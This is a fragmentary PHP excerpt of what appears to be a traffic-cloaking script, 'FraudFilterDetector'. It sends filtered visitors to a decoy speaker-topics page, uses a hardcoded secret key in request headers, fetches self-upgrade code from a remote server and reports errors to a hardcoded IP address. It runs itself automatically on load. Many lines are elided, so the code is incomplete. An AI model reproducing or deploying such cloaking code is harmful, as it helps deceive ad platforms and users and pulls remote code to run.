...
class FraudFilterDetector_n4ibr {
    ...
    function isSignatureValid($sign, $time) {
        $str = '99d12437-7b05-4880-80f0-dbd3f52eccff.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.speakernow.com/topics/emotional-intelligence-speakers/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 99d12437-7b05-4880-80f0-dbd3f52eccff',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 99d12437-7b05-4880-80f0-dbd3f52eccff';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 99d12437-7b05-4880-80f0-dbd3f52eccff';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=n4ibr&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_n4ibr = new FraudFilterDetector_n4ibr();
$fraudFilterDetector_n4ibr->check();
